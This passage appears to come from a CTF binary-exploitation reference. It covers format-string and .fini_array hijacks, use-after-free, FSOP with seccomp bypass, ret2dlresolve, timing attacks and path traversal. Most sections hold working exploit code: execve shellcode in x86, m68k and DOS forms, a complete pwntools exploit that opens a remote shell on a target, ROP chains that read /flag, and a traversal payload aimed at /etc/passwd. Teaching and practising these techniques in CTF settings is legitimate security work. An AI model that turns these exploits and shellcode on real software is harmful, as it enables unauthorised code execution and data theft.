is_real_stack = (ret_addr - pie_base) == 0xdc052  # known offset

# 3. Calculate OOB write offset
# Format string buffer at stack offset N
# Target (return address) at stack offset M
# Distance in bytes = (M - N) * 8
# Map to ledger system: slot = distance // 16, sub_offset = distance % 16

# 4. Overwrite return address with win() via OOB ledger write
# Retry until real stack is used (~50% success rate per attempt)
```

**Single-Interaction Exploitation:** Combine leak + detect + exploit in one format string interaction. If fake stack detected, disconnect and retry.

## Format String with Encoding Constraints + RWX .fini_array Hijack

**Pattern (Encodinator, Nullcon 2026):** Input is base85-encoded into RWX memory at fixed address, then passed to `printf()`.

**Key insight:** Don't try libc-based exploitation. Instead, exploit the RWX mmap region directly:

1. **RWX region at fixed address** (e.g., `0x40000000`): Write shellcode here
2. **`.fini_array` hijack**: Overwrite `.fini_array[0]` to point to shellcode. When `main()` returns, `__libc_csu_fini` calls `fini_array` entries.
3. **Format string writes**: Use `%hn` to write 2 bytes at a time to `.fini_array`

**Argument numbering with base85:**
Base85 decoding changes payload length. The decoded prefix occupies P bytes on stack, so first appended pointer is at arg `6 + P/8`. Use convergence loop:

```python
arg_base = 20  # Initial guess
for _ in range(20):
    fmt = construct_format_string(writes, arg_base)
    # Pad to base85 group boundary (multiple of 5 encoded = 4 raw)
    while len(fmt) % 10 != 0:
        fmt += b"A"
    prefix = b85_decode(fmt)
    new_arg_base = 6 + (len(prefix) // 8)
    if new_arg_base == arg_base:
        break
    arg_base = new_arg_base
```

**Shellcode (19-byte execve):**
```nasm
push 0x3b          ; syscall number
pop rax
cdq                ; rdx = 0
movabs rbx, 0x68732f2f6e69622f  ; "/bin//sh"
push rdx           ; null terminator
push rbx           ; "/bin//sh"
push rsp
pop rdi            ; rdi = pointer to "/bin//sh"
push rdx
pop rsi            ; rsi = NULL
syscall
```

**Why avoid libc:** Base85 encoding makes precise libc address calculations extremely difficult. The RWX region + .fini_array approach uses only fixed addresses (no ASLR, no PIE concerns for the write target).

## Custom Canary Preservation

**Pattern (Canary In The Bitcoin Mine):** Buffer overflow must preserve known canary value.

**Key technique:** Write the exact canary bytes at the correct offset during overflow:
```python
# Buffer: 64 bytes | Canary: "BIRD" (4 bytes) | Target: 1 byte
payload = b'A' * 64 + b'BIRD' + b'X'  # Preserve canary, set target to non-zero
```

**Identification:** Source code shows struct with buffer + canary + flag bool, `gets()` for input.

---

## Integer Truncation via Order of Operations (CSAW 2015)

Incorrect integer arithmetic ordering causes truncation bugs:

```c
// Vulnerable: integer division truncates before multiply
int position = 4 * (ticks / 1000);  // 1500 ticks -> 4 * 1 = 4

// Correct: multiply first to preserve precision
int position = (4 * ticks) / 1000;  // 1500 ticks -> 6000 / 1000 = 6
```

This creates an off-by-N error (position overshoots buffer end by 2 bytes), enabling:
1. Heap metadata corruption via out-of-bounds write
2. Adjacent object pointer overwrite for read/write primitives
3. Chain with heap spray for ASLR bypass via information leak

**Key insight:** Audit integer expressions where division precedes multiplication -- the truncation gap grows with input magnitude.

---

## Signed Integer Bypass (Negative Quantity)

**Pattern (PascalCTF 2026):** Menu program with `scanf("%d")` for quantity. Negative input makes `quantity * price` negative, bypassing `balance >= total_cost` check.

```python
# Select expensive item (e.g., flag drink costing 1B), enter quantity -1
# -1 * 1000000000 = -1000000000 → balance (100) >= -1000000000 ✓
p.sendline(b'10')  # flag item
p.sendline(b'-1')  # negative quantity
```

## Canary-Aware Partial Overflow

**Pattern (MyGit, PascalCTF 2026):** Buffer overflow where `valid` flag sits between buffer end and canary.

**Stack layout:**
- Buffer: `rbp-0x30` (48 bytes)
- Valid flag: `rbp-0x10` (offset 32 from buffer)
- Stack canary: `rbp-0x08` (offset 40 from buffer)

**Key technique:** Use `./` as no-op path padding to control input length precisely:
```text
././././././././././../../../../flag    (36 bytes)
```
- `./` segments normalize to current directory (no-op)
- Byte 32 must be non-zero to set `valid = true`
- Stay under byte 40 to avoid canary

**Exploit chain:**
1. `checkout ././././././././././../../../../flag` - reads `/flag` content as "current commit"
2. `branch create ././././././././././../../../../tmp/leaked` - writes commit (flag) to `/tmp/leaked`
3. `cat /tmp/leaked` - read the exfiltrated flag

## Global Buffer Overflow (CSV Injection)

**Pattern (Spreadsheet):** Adjacent global variables exploitable via overflow.

**Exploitation:**
1. Identify global array adjacent to filename pointer in memory
2. Overflow array bounds by injecting extra delimiters (commas in CSV)
3. Overflowed pointer lands on filename variable
4. Change filename to `flag.txt`, then trigger read operation

```python
# Edit last cell with comma-separated overflow
edit_cell("J10", "whatever,flag.txt")
save()   # CSV row now has 11 columns
load()   # Column 11 overwrites savefile pointer with ptr to "flag.txt"
load()   # Now reads flag.txt into spreadsheet
print_spreadsheet()  # Shows flag
```

## MD5 Preimage Gadget Construction

**Pattern (Hashchain, Nullcon 2026):** Server concatenates N MD5 digests and executes them as code. Brute-force preimages with desired byte prefixes.

**Core technique:** Each MD5 digest is 16 bytes. Use `eb 0c` (jmp +12) as first 2 bytes to skip the middle 12 bytes, landing on bytes 14-15 which become a 2-byte instruction:

```c
// Brute-force MD5 preimage with prefix eb0c and desired 2-byte suffix
for (uint64_t ctr = 0; ; ctr++) {
    sprintf(msg + prefix_len, "%016llx", ctr);
    MD5(msg, msg_len, digest);
    if (digest[0] == 0xEB && digest[1] == 0x0C) {
        uint16_t suffix = (digest[14] << 8) | digest[15];
        if (suffix == target_instruction)
            break;  // Found!
    }
}
```

**Building i386 syscall chains from 2-byte gadgets:**
- `31c0` = `xor eax, eax`
- `89e1` = `mov ecx, esp`
- `b220` = `mov dl, 0x20`
- `cd80` = `int 0x80`
- `40` + NOP = `inc eax`

**Hashchain v1 (JMP to NOP sled):** RWX buffer at `0x40000000` + NOP sled at `0x41000000`. Find MD5 preimage starting with `0xE9` (jmp rel32) that lands in the sled:
```python
# Brute-force: find input whose MD5 starts with E9 and offset lands in NOP sled
# Example: b"v" + b"G" * 86 → MD5 starts with e9 59 1f 2c → jmp 0x412c1f5e
```

**Hashchain v2 (3-hash chain):** Store MD5 digests at user-controlled offsets. Build instruction chain:
- **Offset 0 (jmp +2):** Find input whose MD5 starts with `EB 02` (e.g., `143874`)
- **Offset 4 (push win):** Find input whose MD5 starts with `68 XX XX XX` matching win() address bytes
- **Offset 8 (ret):** Find input whose MD5 byte[1] is `C3` (e.g., `5488` → `56 C3`)

**Pre-computation approach:** Build lookup table mapping MD5 4-byte prefixes to inputs. At runtime, parse win() address from server banner, look up matching push-hash input.

**Brute-force time:** 32-bit prefix match: ~2^32 hashes (~60s on 8 cores). 16-bit: instant.

## VM GC-Triggered UAF — Slab Reuse (EHAX 2026)

**Pattern (SarcAsm):** Custom stack-based VM with NEWBUF/SLICE/GC/BUILTIN opcodes. Slicing a buffer creates a shared reference to the same slab. When the slice is dropped and GC'd, it frees the shared slab even though the parent buffer is still alive.

**Vulnerability:** `free_data()` called on slice frees the underlying slab pointer that the parent buffer still references → UAF read/write through parent.

**Exploit chain:**
1. `NEWBUF 24` → allocates 32-byte slab (slab class matches function objects)
2. `READ 24` → fills buffer, sets length so SLICE bounds check passes
3. `SLICE 0,24` → alias to same slab
4. `DROP` + `GC` → frees the slab via slice's destructor
5. `BUILTIN 0` → allocates function object, reuses freed 32-byte slab (code pointer at offset +8)
6. `WRITEBUF 16,0` → sets parent buffer's length to 16 (no actual write, bypasses bounds)
7. `PRINTB` → leaks code pointer from UAF slab → compute PIE base
8. `READ 16` → overwrites code pointer with `win()` address
9. `CALL` → executes `win()` → `execve("/bin/sh")`

```python
from pwn import *
import struct

# ULEB128 encoding for VM immediates
def uleb128(val):
    result = b''
    while True:
        byte = val & 0x7f
        val >>= 7
        if val: byte |= 0x80
        result += bytes([byte])
        if not val: break
    return result

# Opcodes
NEWBUF, READ, SLICE, DROP, GC = b'\x20', b'\x21', b'\x22', b'\x04', b'\x60'
BUILTIN, CALL, GLOAD, GSTORE = b'\x40', b'\x41', b'\x30', b'\x31'
WRITEBUF, PRINTB, PUSH, HALT = b'\x25', b'\x23', b'\x01', b'\xff'

code = b''
code += NEWBUF + uleb128(24) + GSTORE + uleb128(0)  # buf A in slot 0
code += GLOAD + uleb128(0) + READ + uleb128(24)      # fill to set length
code += GLOAD + uleb128(0) + SLICE + uleb128(0) + uleb128(24)  # slice
code += DROP + GC                                      # free slab via slice
code += BUILTIN + uleb128(0) + GSTORE + uleb128(1)   # func F reuses slab
code += GLOAD + uleb128(0) + WRITEBUF + uleb128(16) + uleb128(0)  # set len=16
code += GLOAD + uleb128(0) + PRINTB                    # leak code ptr
code += GLOAD + uleb128(0) + READ + uleb128(16)       # overwrite code ptr
code += PUSH + b'\x00' + GLOAD + uleb128(1) + CALL + uleb128(1)  # call win
code += HALT

blob = struct.pack('<I', len(code)) + code
p = remote('target', 9999)
p.send(blob + b'A'*24)          # blob + dummy READ data
leak = p.recv(16, timeout=5)
code_ptr = struct.unpack('<Q', leak[:8])[0]
win_addr = (code_ptr - 0x31d0) + 0x3000  # PIE base + win offset
p.send(struct.pack('<Q', win_addr) + b'\x00'*8)
p.sendline(b'cat /flag*')
p.interactive()
```

**Key lessons:**
- **Slab allocator reuse:** Function objects and buffer data share the same slab size class → guaranteed UAF overlap
- **WRITEBUF length trick:** Setting length without writing data bypasses bounds checks but exposes UAF content
- **GC as trigger:** Explicit `GC` opcode forces immediate collection → deterministic UAF timing
- **General pattern:** In custom VMs, look for shared references (slices, views, aliases) where destruction of one frees resources still held by another

---

## Path Traversal Sanitizer Bypass

**Pattern (Galactic Archives):** Sanitizer skips character after finding banned char.

```python
# Sanitizer removes '.' and '/' but skips next char after match
# ../../etc/passwd -> bypass with doubled chars:
"....//....//etc//passwd"
# Each '..' becomes '....' (first '.' caught, second skipped, third caught, fourth survives)
```

**Flag via `/proc/self/fd/N`:**
- If binary opens flag file but doesn't close fd, read via `/proc/self/fd/3`
- fd 0=stdin, 1=stdout, 2=stderr, 3=first opened file

## Timing Attack for Character-by-Character Flag Recovery (RC3 CTF 2016)

When a server validates input character-by-character with measurable per-character delay, use timing side-channels to brute-force the flag one byte at a time.

```python
import socket
import time
import string

def measure_time(host, port, guess):
    """Send guess and measure server response time"""
    s = socket.socket()
    s.connect((host, port))
    s.recv(1024)  # banner

    start = time.time()
    s.send(guess.encode() + b'\n')
    s.recv(1024)
    elapsed = time.time() - start

    s.close()
    return elapsed

flag = "RC3-2016-"
charset = string.ascii_letters + string.digits + "_-{}"
THRESHOLD = 0.15  # seconds per correct character (calibrate per target)
SAMPLES = 3       # average multiple measurements to reduce noise

while not flag.endswith('}'):
    best_char = ''
    best_time = 0

    for c in charset:
        guess = flag + c
        # Average multiple samples to reduce network jitter
        avg_time = sum(measure_time(host, port, guess) for _ in range(SAMPLES)) / SAMPLES

        if avg_time > best_time:
            best_time = avg_time
            best_char = c

    if best_time > len(flag) * THRESHOLD:
        flag += best_char
        print(f"Flag so far: {flag} (time: {best_time:.3f}s)")
    else:
        print("Timing unclear, retrying...")

print(f"Flag: {flag}")
```

**Key insight:** Each correct character adds a measurable delay (typically 100-250ms). Average multiple samples to overcome network jitter. The total response time scales linearly with the number of correct prefix characters, making the correct character at each position distinguishable.

---

## FSOP + Seccomp Bypass via openat/mmap/write (EHAX 2026)

**Pattern (The Revenge of Womp Womp):** Heap exploit (UAF) leading to FSOP chain, but seccomp blocks standard `open`/`read`/`write` or `execve`. Use alternative syscalls to read the flag.

**Exploit chain:**
1. **Leak libc** via `show()` on freed unsorted bin chunk (fd/bk pointers)
2. **UAF → unsafe unlink** to redirect pointer to `.bss` region
3. **Craft fake FILE** structure on heap with vtable pointing to `_IO_wfile_jumps`
4. **FSOP chain:** `_IO_wfile_overflow` → `_IO_wdoallocbuf` → `_IO_WDOALLOCATE(fp)`
5. **Stack pivot** via `mov rsp, rdx` gadget (rdx controllable from FILE struct)
6. **ROP chain** using seccomp-compatible syscalls

**Seccomp bypass with openat/mmap/write:**
```python
# When seccomp blocks open() and read(), use:
# openat(AT_FDCWD, "/flag", O_RDONLY)  - syscall 257
# mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, fd, 0)  - syscall 9
# write(STDOUT, mapped_addr, 4096)  - syscall 1

from pwn import *

rop = ROP(libc)
# openat(AT_FDCWD=-100, "/flag", O_RDONLY=0)
rop.raw(pop_rdi)
rop.raw(-100 & 0xffffffffffffffff)  # AT_FDCWD
rop.raw(pop_rsi)
rop.raw(flag_str_addr)               # pointer to "/flag\x00"
rop.raw(pop_rdx_rbx)
rop.raw(0)                            # O_RDONLY
rop.raw(0)
rop.raw(libc.sym.openat)

# mmap(NULL, 4096, PROT_READ=1, MAP_PRIVATE=2, fd=3, 0)
rop.raw(pop_rdi)
rop.raw(0)                            # addr = NULL
rop.raw(pop_rsi)
rop.raw(0x1000)                       # length
rop.raw(pop_rdx_rbx)
rop.raw(1)                            # PROT_READ
rop.raw(0)
# r10 = MAP_PRIVATE (2), r8 = fd (3) - need gadgets for these
rop.raw(libc.sym.mmap)

# write(1, mapped_addr, 4096)
rop.raw(pop_rdi)
rop.raw(1)                            # stdout
rop.raw(pop_rsi)
rop.raw(mapped_addr)                  # mmap return value
rop.raw(pop_rdx_rbx)
rop.raw(0x1000)
rop.raw(0)
rop.raw(libc.sym.write)
```

**`mov rsp, rdx` stack pivot gadget:**
```python
# Common in libc — search with:
# ROPgadget --binary libc.so.6 | grep "mov rsp, rdx"
# or: one_gadget libc.so.6 (sometimes lists pivot gadgets)

# In FSOP context: rdx is controllable via _IO_wide_data fields
# Set _wide_data->_IO_buf_base to point to your ROP chain
# When _IO_WDOALLOCATE is called, rdx = _wide_data->_IO_buf_base
# Pivot: mov rsp, rdx → ROP chain runs
```

**Key insight:** "Stale size tracking" = the menu tracks object sizes but doesn't invalidate after free. This enables UAF because `show()`/`edit()` still use the old size to access freed memory. Always check if delete nullifies the size field in addition to the pointer.

**Seccomp alternative syscall quick reference:**
| Blocked | Alternative | Syscall # |
|---------|------------|-----------|
| `open` | `openat` | 257 |
| `open` | `openat2` | 437 |
| `read` | `mmap` + access | 9 |
| `read` | `pread64` | 17 |
| `read` | `readv` | 19 |
| `write` | `writev` | 20 |
| `write` | `sendfile` | 40 |

---

## Motorola 68000 (m68k) Two-Stage Shellcode (HackIT 2017)

**Pattern:** m68k Linux binary accepts only 14 bytes of shellcode. Two-stage approach: the first stage jumps back to the binary's own `read()` call with a larger buffer size and the existing mmap'd RWX pointer. The full second-stage shellcode performs socket reuse via `dup2` and `execve('/bin/sh')`. m68k syscall convention: number in `d0`, arguments in `d1`–`d3`, `trap #0`.

m68k Linux syscall numbers: `read=3`, `write=4`, `dup2=63`, `execve=11`.

```asm
; Stage 1 (14 bytes): patch d3=256 and jump to binary's read() call site
; Reuses binary's existing socket fd (d1) and mmap'd RWX region (d2)
move.l  #256, %d3        ; count = 256  (4 bytes: 0x263C 0x0000 0x0100)
jmp     read_call_site   ; jump to binary's trap #0  (6 bytes: 0x4EF9 + 4-byte addr)
```

```asm
; Stage 2 (full shellcode read into RWX region by stage 1):
; dup2(sock_fd, 0/1/2) — sock_fd is already in d1 from stage 1
moveq   #63, %d0         ; dup2
moveq   #0,  %d2         ; newfd = stdin
trap    #0
moveq   #63, %d0
moveq   #1,  %d2         ; newfd = stdout
trap    #0
moveq   #63, %d0
moveq   #2,  %d2         ; newfd = stderr
trap    #0

; execve("/bin/sh", ["/bin/sh", NULL], NULL)
lea     binsh(%pc), %a0  ; "/bin/sh\0"
move.l  %a0, %d1
sub.l   %d2, %d2         ; d2 = NULL (argv approximation for CTF)
sub.l   %d3, %d3         ; d3 = NULL (envp)
moveq   #11, %d0         ; execve
trap    #0
binsh:  .ascii "/bin/sh\0"
```

**Key insight:** When shellcode size is severely constrained, re-use the program's own `read()` function with the already-mmap'd RWX region as the destination buffer. m68k uses `trap #0` with d0–d3 registers, not the x86 `int 0x80`/`syscall` convention.

**References:** HackIT CTF 2017

---

## DOS COM Real Mode Shellcode (SEC-T CTF 2017)

**Pattern:** DOS COM executables run in 16-bit real mode with no memory protection — the code segment is writable at runtime. An arbitrary write primitive into the code segment at an EXIT handler location allows injecting payload code. Payloads use DOS `int 0x21` syscalls: `ah=0x3d` (open file), `ah=0x3f` (read file), `ah=0x09` (print string).

```asm
; DOS COM exploitation: code segment is writable
; INT 0x21 syscall convention: ah = function number
; Useful functions:
;   ah=0x3d  open file: ds:dx = filename, al = mode → ax = fd
;   ah=0x3f  read file: bx = fd, cx = count, ds:dx = buffer → ax = bytes read
;   ah=0x09  print $-terminated string: ds:dx = string address
;   ah=0x4c  exit: al = exit code

; Example: read flag.txt and print it
mov dx, offset flag_name   ; "flag.txt$"
mov ax, 0x3d00             ; open, read-only
int 0x21                   ; ax = file handle

mov bx, ax                 ; fd = file handle
mov dx, offset buffer
mov cx, 0x100              ; read 256 bytes
mov ah, 0x3f
int 0x21                   ; read into buffer

; Terminate buffer with '$' for int 0x21 ah=0x09
mov dx, offset buffer
mov ah, 0x09
int 0x21                   ; print buffer
```

**Key insight:** DOS COM files have no read-only memory — the code segment is writable. DOS interrupts `int 0x21` with `ah=3d/3f/09` handle open/read/print. Any write primitive that reaches the code segment can inject executable shellcode, even at EXIT handler positions.

**References:** SEC-T CTF 2017

---

## Seccomp BPF X-Register Addressing Mode Bypass (HITCON 2017)

**Pattern:** A seccomp BPF filter uses the X-register addressing mode (opcode `0x1d`) to compare `syscall_number == rdx` (the third argument). However, `libseccomp-tools` (and older `seccomp-tools`) disassemblers do not support the X-register addressing mode, causing the filter to appear more restrictive than it actually is. Reality: if `rax` (syscall number) equals `rdx` (3rd argument) at the time of the syscall, the comparison passes and the syscall is allowed.

**How to detect:**
```bash
# Dump BPF bytecode manually and look for opcode 0x1d (JEQ X)
# seccomp-tools disassembly will show "???" or skip lines for 0x1d opcodes
# Raw bytecode: struct sock_filter { __u16 code; __u8 jt; __u8 jf; __u32 k; }
# code=0x1d: BPF_JMP | BPF_JEQ | BPF_X  → compare A == X (X-register)
python3 -c "
import struct
data = open('seccomp_filter.bin','rb').read()
for i in range(0, len(data), 8):
    code, jt, jf, k = struct.unpack('<HBBI', data[i:i+8])
    if code == 0x1d:
        print(f'[{i//8}] JEQ X  jt={jt} jf={jf}  (X-reg compare!)')
"
```

**Exploitation:**
```python
# Filter effectively allows: syscall if rax == rdx
# Arrange rdx to equal the desired syscall number before the syscall instruction
# Example: execve = 59, so set rdx = 59 and rax = 59
# Both conditions match → filter permits the call
rop = flat(
    pop_rdx_rbx, 59, 0,     # rdx = 59 (execve)
    pop_rax, 59,             # rax = 59
    pop_rdi, binsh_addr,
    pop_rsi, 0,
    syscall_ret,
)
```

**Key insight:** Security tools that cannot decode all BPF addressing modes give false confidence — always verify filter behavior by reading raw BPF bytecode or testing empirically. The X-register mode (`JEQ X`, opcode `0x1d`) is valid BPF but rarely generated by `libseccomp`, so tools miss it.

**References:** HITCON CTF 2017

---

## Custom Printf Format Specifier Arginfo Overwrite (Hack.lu 2017)

**Pattern:** glibc's `register_printf_specifier()` stores function pointers (including an `arginfo` callback) in a heap buffer. A heap overflow overwrites the `arginfo` callback for a custom format specifier. The first field of `printf_info` passed to the `arginfo` function is `precision` — an attacker-controlled integer from `%.Ns` (where N is the precision value). Encoding a shell command as its decimal ASCII value (e.g., `26739` = `'s','h','\0'` as little-endian bytes) causes the `arginfo` callback to receive `"sh"` as its string argument, achieving command execution.

**Mechanism:**
```c
// register_printf_specifier stores:
//   handler_fn   (called to produce output)
//   arginfo_fn   (called to determine argument type/size)
// Both are stored as pointers in a heap region

// When printf("%.26739s", ...) is called with custom specifier:
//   printf_info.precision = 26739  (= 0x6873 = 'sh' in little-endian)
//   arginfo_fn is called with &printf_info as first argument
//   If arginfo_fn = system: system((char*)&printf_info) → system("sh\x00...")
//   because the precision field at offset 0 contains the bytes 's','h','\0'
```

**Exploitation:**
```python
# Overflow heap to overwrite arginfo_fn pointer with system()
# Then trigger with precision encoding the command:
# "sh" = ord('s') + ord('h') * 256 = 0x68 * 256 + 0x73 = 26739
payload = b'%.26739s'  # precision=26739, bytes: 0x73 0x68 0x00 = "sh\0"
# When custom specifier is used, arginfo(printf_info_ptr) → system("sh")
```

**Key insight:** Custom printf format handlers expose `precision` and `width` as attacker-controlled integers in `printf_info`. Encoding a shell command as the decimal precision value (e.g., `26739` = `"sh\0"`) causes the `arginfo` callback — if overwritten with `system()` — to execute the command. The `printf_info` struct's first field is the argument to `system()`.

**References:** Hack.lu CTF 2017

---

See [advanced-exploits-2.md](advanced-exploits-2.md) for bytecode validator bypass, io_uring UAF with SQE injection, integer truncation bypass, GC null-reference cascading corruption, leakless libc via multi-fgets, signed/unsigned char underflow with TLS destructor hijack, custom shadow stack bypass, and signed int overflow with XSS-to-binary pwn bridge.

See [advanced-exploits-3.md](advanced-exploits-3.md) for stack variable overlap, 1-byte overflow via 8-bit loop counter, game AI arithmetic mean OOB read, arbitrary read/write GOT overwrite, stack leak via __environ + memcpy overflow, JIT sandbox uint16 jump truncation, DNS compression pointer overflow, and ELF signing bypass via program header manipulation.


# advanced

# CTF Pwn - Advanced Techniques

## Table of Contents
- [Seccomp Advanced Techniques](#seccomp-advanced-techniques)
  - [openat2 Bypass (New Age Pattern)](#openat2-bypass-new-age-pattern)
  - [Conditional Buffer Address Restrictions](#conditional-buffer-address-restrictions)
  - [Shellcode Construction Without Relocations (pwntools)](#shellcode-construction-without-relocations-pwntools)
  - [Seccomp Analysis from Disassembly](#seccomp-analysis-from-disassembly)
- [rdx Control in ROP Chains](#rdx-control-in-rop-chains)
- [Use-After-Free (UAF) Exploitation](#use-after-free-uaf-exploitation)
- [JIT Compilation Exploits](#jit-compilation-exploits)
- [Esoteric Language GOT Overwrite](#esoteric-language-got-overwrite)
- [Heap Overlap via Base Conversion](#heap-overlap-via-base-conversion)
- [Tree Data Structure Stack Underallocation](#tree-data-structure-stack-underallocation)
- [ret2dlresolve](#ret2dlresolve)
- [Kernel Exploitation](#kernel-exploitation) (basic; see [kernel.md](kernel.md) for full coverage)

**See also:** [heap-techniques.md](heap-techniques.md) — House of Apple 2, House of Einherjar, House of Orange/Spirit/Lore/Force, heap grooming, custom allocator exploitation (nginx, talloc), classic unlink, musl libc heap, tcache stashing unlink

---

## Seccomp Advanced Techniques

### openat2 Bypass (New Age Pattern)

`openat2` (syscall 437, Linux 5.6+) frequently missed in seccomp filters blocking `open`/`openat`:
```python
# struct open_how { u64 flags; u64 mode; u64 resolve; }  = 24 bytes
# openat2(AT_FDCWD, filename, &open_how, sizeof(open_how))
```

### Conditional Buffer Address Restrictions

Seccomp `SCMP_CMP_LE`/`SCMP_CMP_GE` on buffer addresses:
- `read()` KILL if buf <= code_region + X → read to high addresses
- `write()` KILL if buf >= code_region + Y → write from low addresses

**Bypass:** Read into allowed region, `rep movsb` copy to write-allowed region:
```nasm
lea rsi, [r14 + 0xc01]   ; buf > code_region+0xc00 (passes read check)
xor rax, rax              ; __NR_read
syscall
mov r13, rax
lea rsi, [r14 + 0xc01]   ; src (high)
lea rdi, [r14 + 0x200]   ; dst (low, < code_region+0x400)
mov rcx, r13
rep movsb
mov rdi, 1
lea rsi, [r14 + 0x200]   ; buf < code_region+0x400 (passes write check)
mov rdx, r13
mov rax, 1                ; __NR_write
syscall
```

### Shellcode Construction Without Relocations (pwntools)

pwntools `asm()` fails with forward label references. Fix with manual jmp/call:

```python
body = asm('''
    pop rbx              /* rbx = address after call instruction */
    mov r14, rbx
    and r14, -4096       /* page-align for code_region base */
    mov rsi, rbx         /* filename pointer */
    /* ... rest of shellcode ... */
fail:
    mov rdi, 1
    mov rax, 60
    syscall
''')
call_offset = -(len(body) + 5)
call_instr = b'\xe8' + p32(call_offset & 0xffffffff)
jmp_instr = b'\xeb' + bytes([len(body)]) if len(body) < 128 else b'\xe9' + p32(len(body))
shellcode = jmp_instr + body + call_instr + b"filename.txt\x00"
# call pushes filename address onto stack, pop rbx retrieves it
```

### Seccomp Analysis from Disassembly

```c
seccomp_rule_add(ctx, action, syscall_nr, arg_count, ...)
```

`scmp_arg_cmp` struct: `arg` (+0x00, uint), `op` (+0x04, int), `datum_a` (+0x08, u64), `datum_b` (+0x10, u64)

SCMP_CMP operators: `NE=1, LT=2, LE=3, EQ=4, GE=5, GT=6, MASKED_EQ=7`

Default action `0x7fff0000` = `SCMP_ACT_ALLOW`

---

## rdx Control in ROP Chains

See [rop-and-shellcode.md](rop-and-shellcode.md#rdx-control-in-rop-chains) for full details and code examples.

---

## Use-After-Free (UAF) Exploitation

**Pattern:** Menu create/delete/view where `free()` doesn't NULL pointer.

**Classic UAF flow:**
1. Create object A (allocates chunk with function pointer)
2. Leak address via inspect/view (bypass PIE)
3. Free object A (creates dangling pointer)
4. Allocate object B of **same size** (reuses freed chunk via tcache)
5. Object B data overwrites A's function pointer with `win()` address
6. Trigger A's callback -> jumps to `win()`

**Key insight:** Both structs must be the same size for tcache to reuse the chunk.

```python
create_report("sighting-0")  # 64-byte struct with callback ptr at +56
leak = inspect_report(0)      # Leak callback address for PIE bypass
pie_base = leak - redaction_offset
win_addr = pie_base + win_offset

delete_report(0)              # Free chunk, dangling pointer remains
create_signal(b"A"*56 + p64(win_addr))  # Same-size struct overwrites callback
analyze_report(0)             # Calls dangling pointer -> win()
```

---

## JIT Compilation Exploits

**Pattern (Santa's Christmas Calculator):** Off-by-one in instruction encoding causes misaligned machine code.

**Exploitation flow:**
1. Find the boundary value that triggers wrong instruction form (e.g., 128 vs 127)
2. Misaligned bytes become executable instructions
3. Control `rax` to survive invalid dereferences (point to writable memory)
4. Embed shellcode as operand bytes of subtraction operations
5. Chain 4-byte shellcode blocks with 2-byte `jmp` instructions between them

**2-byte instruction shellcode tricks:**
- `push rdx; pop rsi` = `mov rsi, rdx` in 2 bytes
- `xor eax, eax` = 2 bytes (set syscall number)
- `not dl` = 2 bytes (adjust pointer)
- Use `sys_read` to stage full shellcode on RWX page, then jump to it

## Esoteric Language GOT Overwrite

**Pattern (Pikalang):** Brainfuck/Pikalang interpreter with unbounded tape allows arbitrary memory access.

**Exploitation:**
1. Tape pointer starts at known buffer address
2. Move pointer backward/forward to reach GOT entry (e.g., `strlen@GOT`)
3. Overwrite GOT entry byte-by-byte with `system()` address
4. Next call to overwritten function triggers `system(controlled_string)`

**Key insight:** Unbounded tape = arbitrary read/write primitive relative to buffer base.

## Heap Overlap via Base Conversion

**Pattern (Santa's Base Converter):** Number stored as string in different bases has different lengths.

**Exploitation:**
1. Store number in base with short representation (e.g., base-36)
2. Convert to base with longer representation (e.g., base-2/binary)
3. Longer string overflows into adjacent heap chunk metadata
4. Corrupted chunk overlaps with target allocation

**Limited charset constraint:** Only digits/letters available (0-9, a-z) limits writable byte values.

## Tree Data Structure Stack Underallocation

**Pattern (Christmas Trees):** Imbalanced binary tree causes stack buffer underallocation.

**Vulnerability:** Stack allocation based on balanced tree assumption (`2^depth` nodes), but actual traversal of imbalanced tree uses more stack than allocated buffer, causing overflow.

**Exploitation:** Craft tree structure that causes traversal to overflow buffer → overwrite return address → ret2win (partial overwrite if PIE).

---

## ret2dlresolve

**Pattern:** Forge `Elf64_Sym` and `Elf64_Rela` structures to trick the dynamic linker into resolving an arbitrary function (e.g., `system`) at the next PLT call. Bypasses ASLR without any libc leak.

```python
from pwn import *

# pwntools has built-in ret2dlresolve support
rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])

rop.read(0, dlresolve.data_addr)  # Read forged structures to known address
rop.ret2dlresolve(dlresolve)       # Trigger resolution

# Stage 1: Send ROP chain
io.sendline(flat({offset: rop.chain()}))

# Stage 2: Send forged dl-resolve payload
io.sendline(dlresolve.payload)
```

**Manual approach (understanding the internals):**
```python
# Forge at a writable address (e.g., .bss)
# 1. Fake Elf64_Rela: points PLT slot to our fake Elf64_Sym
# 2. Fake Elf64_Sym: st_name offset points to our "system" string
# 3. "system\x00" string

SYMTAB = elf.dynamic_value_by_tag('DT_SYMTAB')
STRTAB = elf.dynamic_value_by_tag('DT_STRTAB')
JMPREL = elf.dynamic_value_by_tag('DT_JMPREL')

# Calculate reloc_index so PLT stub pushes correct index
reloc_index = (fake_rela_addr - JMPREL) // 0x18  # sizeof(Elf64_Rela)

# Fake Elf64_Sym.st_name = offset from STRTAB to our "system" string
fake_sym_st_name = fake_string_addr - STRTAB
```

**Key insight:** ret2dlresolve works without ANY leak. It exploits the lazy binding mechanism: when a PLT function is called for the first time, the dynamic linker looks up the symbol name and resolves it. By forging the lookup structures, you can make it resolve any libc function. Use pwntools' `Ret2dlresolvePayload` for automation.

**Requirements:** Partial RELRO (Full RELRO resolves all symbols at load time, defeating this). Writable memory to place forged structures.

---

## Kernel Exploitation

For comprehensive kernel exploitation techniques, see [kernel.md](kernel.md). Quick reference:

- `modprobe_path` overwrite for root code execution (requires AAW)
- `tty_struct` kROP via fake vtable and stack pivot
- `userfaultfd` for deterministic race conditions
- Heap spray with `tty_struct`, `poll_list`, `user_key_payload`, `seq_operations`
- KASLR/FGKASLR/SMEP/SMAP/KPTI bypass techniques
- Kernel config recon checklist

**Basic patterns (userland-adjacent):**
- OOB via vulnerable `lseek` handlers
- Heap grooming with forked processes
- SUID binary exploitation via kernel-to-userland buffer overflow
- Check kernel config for disabled protections:
  - `CONFIG_SLAB_FREELIST_RANDOM=n` → sequential heap chunks
  - `CONFIG_SLAB_MERGE_DEFAULT=n` → predictable allocations


# field-notes

# Pwn Field Notes

Detailed pwn notes that support [`SKILL.md`](SKILL.md). Read this file after confirming the challenge really needs exploitation.

## Table of Contents

- [Heap Exploitation](#heap-exploitation)
- [Additional Exploit Notes](#additional-exploit-notes)
- [Useful Commands](#useful-commands)

## Heap Exploitation

- tcache poisoning (glibc 2.26+), fastbin dup / double free
- House of Force (old glibc), unsorted bin attack
